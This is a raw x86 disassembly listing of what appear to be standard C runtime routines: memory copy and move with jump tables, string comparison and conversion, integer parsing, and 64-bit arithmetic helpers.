  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
